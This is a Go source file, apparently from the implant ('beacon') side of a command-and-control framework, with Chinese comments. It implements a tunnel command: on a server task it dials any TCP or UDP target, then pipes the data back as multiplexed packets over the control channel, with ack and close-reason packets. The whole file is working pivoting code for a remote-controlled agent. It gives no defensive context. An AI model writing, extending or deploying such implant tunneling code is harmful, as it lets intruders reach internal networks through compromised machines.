package command

import (
	"beacon/pkg/utils/packet"
	"context"
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"sync/atomic"
	"syscall"
	"time"
)

// TunnelStartCommand 处理 tunnel 启动指令的任务对象。
type TunnelStartCommand struct {
	BeaconID   uint32
	SessionKey []byte
}

const (
	tunnelTCPReadBufferSize = 16 * 1024
	tunnelUDPReadBufferSize = 32 * 1024
	tunnelReadPollInterval  = 500 * time.Millisecond
	tunnelUDPIdleTimeout    = 15 * time.Second
)

func (c *TunnelStartCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
	return StartTunnelTask(0, p, acp)
}

func StartTunnelTask(originalTaskID uint32, p *packet.Parser, acp int) ([][]byte, error) {
	req, err := ParseTunnelStart(p)
	if err != nil {
		return nil, err
	}
	if req.Proto != "tcp" && req.Proto != "udp" {
		return nil, fmt.Errorf("unsupported proto: %s", req.Proto)
	}
	go startTunnelChannel(originalTaskID, req)

	// Tunnel 指令不返回常规任务结果，因为状态通过控制信道多路复用回传
	return nil, nil
}

func startTunnelChannel(originalTaskID uint32, req TunnelStart) {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// 1. 尝试连接目标
	targetConn, reason, err := dialTarget(req)
	if err != nil {
		// 如果连接失败，向服务端发送一个带有错误原因的控制包
		sendControlPacket(req.TunnelID, req.ChannelID, "close", reason, nil)
		return
	}

	// 2. 注册并开始转发
	ch := &TunnelChannel{
		OriginalTaskID: originalTaskID,
		TunnelID:       req.TunnelID,
		ChannelID:      req.ChannelID,
		Mode:           req.Mode,
		Proto:          req.Proto,
		TargetAddress:  req.TargetAddress,
		TargetConn:     targetConn,
		Cancel:         cancel,
		CreatedAt:      time.Now(),
	}
	ch.TouchLastSeen(time.Now())

	if err := tunnelRuntime.Add(ch); err != nil {
		targetConn.Close()
		reason := TunnelReasonUnknown
		if errors.Is(err, errTunnelChannelLimit) {
			reason = TunnelReasonQueueFull
		} else if errors.Is(err, errTunnelChannelDuplicate) {
			reason = TunnelReasonDuplicateChannel
		}
		sendControlPacket(req.TunnelID, req.ChannelID, "close", reason, nil)
		return
	}
	sendStartAckPacket(req)
	defer tunnelRuntime.Remove(req.TunnelID, req.ChannelID)

	// 3. 进入多路复用泵
	pipeMultiplexed(ctx, ch)
}

func sendControlPacket(tunnelID, channelID string, action string, reason int32, data []byte) {
	reasonStr := ""
	if reason != TunnelReasonNone {
		reasonStr = fmt.Sprintf("error_%d", reason)
	}
	ctrl := TunnelControl{
		TunnelID:  tunnelID,
		ChannelID: channelID,
		Action:    action,
		Reason:    reasonStr,
	}
	payload, err := PackTunnelControl(ctrl)
	if err != nil {
		return
	}
	// 封装为 FinalPacket (TaskId=0, CommandId=61: Control) 并存入队列
	finalPkt := packet.MakeFinalPacket(0, CommandTunnelControl, payload)
	tunnelRuntime.PushControlPacket(finalPkt)
}

func sendStartAckPacket(req TunnelStart) {
	payload, err := PackTunnelStart(req)
	if err != nil {
		return
	}
	finalPkt := packet.MakeFinalPacket(0, CommandTunnelStart, payload)
	tunnelRuntime.PushControlPacket(finalPkt)
}

func sendDataPacket(tunnelID, channelID string, data []byte) {
	pkt := TunnelData{
		TunnelID:  tunnelID,
		ChannelID: channelID,
		Data:      data,
	}
	payload, err := PackTunnelData(pkt)
	if err != nil {
		return
	}
	// 封装为 FinalPacket (TaskId=0, CommandId=62: Data) 并存入队列
	finalPkt := packet.MakeFinalPacket(0, CommandTunnelData, payload)
	tunnelRuntime.PushDataPacket(finalPkt)
}

func dialTarget(req TunnelStart) (net.Conn, int32, error) {
	timeout := time.Duration(req.ConnectTimeoutMS) * time.Millisecond
	if timeout <= 0 {
		timeout = 10 * time.Second
	}

	conn, err := net.DialTimeout(req.Proto, req.TargetAddress, timeout)
	if err != nil {
		return nil, mapDialError(err), err
	}
	return conn, TunnelReasonNone, nil
}

func pipeMultiplexed(ctx context.Context, ch *TunnelChannel) {
	defer ch.Close()

	bufSize := tunnelTCPReadBufferSize
	if ch.Proto == "udp" {
		bufSize = tunnelUDPReadBufferSize
	}
	buf := make([]byte, bufSize)
	for {
		select {
		case <-ctx.Done():
			return
		default:
			if ch.IsPaused() {
				time.Sleep(100 * time.Millisecond)
				continue
			}

			_ = ch.TargetConn.SetReadDeadline(time.Now().Add(tunnelReadPollInterval))
			n, err := ch.TargetConn.Read(buf)
			if n > 0 {
				atomic.AddInt64(&ch.BytesOut, int64(n))
				ch.TouchLastSeen(time.Now())
				// 异步发送数据 (ID 62)
				sendDataPacket(ch.TunnelID, ch.ChannelID, buf[:n])
				if ch.Proto == "udp" {
					return
				}
			}

			if err != nil {
				if ch.Closed.Load() {
					return
				}
				if ne, ok := err.(net.Error); ok && ne.Timeout() {
					if ch.Proto == "udp" && time.Since(ch.LastSeen()) > tunnelUDPIdleTimeout {
						sendControlPacket(ch.TunnelID, ch.ChannelID, "close", TunnelReasonTimeout, nil)
						return
					}
					continue
				}
				// 通知服务端连接已由于错误关闭 (ID 61)
				sendControlPacket(ch.TunnelID, ch.ChannelID, "close", mapTunnelError(err), nil)
				return
			}
		}
	}
}

func mapDialError(err error) int32 {
	return mapTunnelError(err)
}

func mapTunnelError(err error) int32 {
	if err == nil {
		return TunnelReasonNone
	}
	if errors.Is(err, io.EOF) {
		return TunnelReasonPeerClosed
	}
	if errors.Is(err, os.ErrDeadlineExceeded) {
		return TunnelReasonTimeout
	}
	if errors.Is(err, context.Canceled) {
		return TunnelReasonCanceled
	}
	if errors.Is(err, syscall.ECONNREFUSED) {
		return TunnelReasonConnectionRefused
	}
	if errors.Is(err, syscall.ENETUNREACH) || errors.Is(err, syscall.EHOSTUNREACH) {
		return TunnelReasonNetworkUnreachable
	}
	if errors.Is(err, syscall.ETIMEDOUT) {
		return TunnelReasonTimeout
	}
	if errors.Is(err, syscall.ECONNRESET) {
		return TunnelReasonConnectionReset
	}
	if errors.Is(err, syscall.EPIPE) {
		return TunnelReasonBrokenPipe
	}
	if errors.Is(err, syscall.ECONNABORTED) {
		return TunnelReasonConnectionAborted
	}

	msg := strings.ToLower(err.Error())
	switch {
	case strings.Contains(msg, "timeout"):
		return TunnelReasonTimeout
	case strings.Contains(msg, "refused"):
		return TunnelReasonConnectionRefused
	case strings.Contains(msg, "unreachable"):
		return TunnelReasonNetworkUnreachable
	case strings.Contains(msg, "no such host"), strings.Contains(msg, "lookup"):
		return TunnelReasonDNSFailed
	case strings.Contains(msg, "connection reset"):
		return TunnelReasonConnectionReset
	case strings.Contains(msg, "broken pipe"):
		return TunnelReasonBrokenPipe
	case strings.Contains(msg, "connection aborted"):
		return TunnelReasonConnectionAborted
	case strings.Contains(msg, "eof"):
		return TunnelReasonPeerClosed
	}

	return TunnelReasonUnknown
}
